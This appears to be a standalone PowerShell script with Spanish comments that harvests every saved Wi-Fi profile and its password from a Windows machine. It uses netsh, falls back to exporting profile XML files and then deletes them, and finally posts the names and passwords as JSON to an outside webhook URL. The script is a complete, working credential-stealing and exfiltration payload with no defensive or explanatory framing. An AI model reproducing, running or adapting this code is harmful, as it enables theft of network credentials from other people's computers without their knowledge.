# Params
$webhook = 'https://webhook-test.com/dac752f76cec8c9fa7e9cff1baac3d64'
$temp    = $env:TEMP

# 1) Capturar SSIDs
$ssids = netsh wlan show profiles |
  Select-String 'Perfil de todos los usuarios\s*:\s*(.+)$' |
  ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }

# 2) Extract con fallback
$result = foreach($name in $ssids) {
  # a) Intento rápido
  $det   = netsh wlan show profile name="$name" key=clear 2>$null
  $line  = $det | Select-String 'Contenido de la clave\s*:\s*(.+)$'
  if($line) {
    $pass = $line.Matches[0].Groups[1].Value.Trim()
  }
  else {
    # b) Fallback: exportar perfil a XML
    netsh wlan export profile name="$name" key=clear folder="$temp" > $null
    $xmlf = Get-ChildItem $temp -Filter "$name*.xml" | Select-Object -First 1
    if($xmlf) {
      $xml  = [xml](Get-Content $xmlf.FullName)
      $pass = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
      Remove-Item $xmlf.FullName -ErrorAction SilentlyContinue
    }
    else {
      $pass = ''
    }
  }
  [PSCustomObject]@{ Profile = $name; Password = $pass }
}

# 3) Enviar JSON
$json = $result | ConvertTo-Json
Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body $json
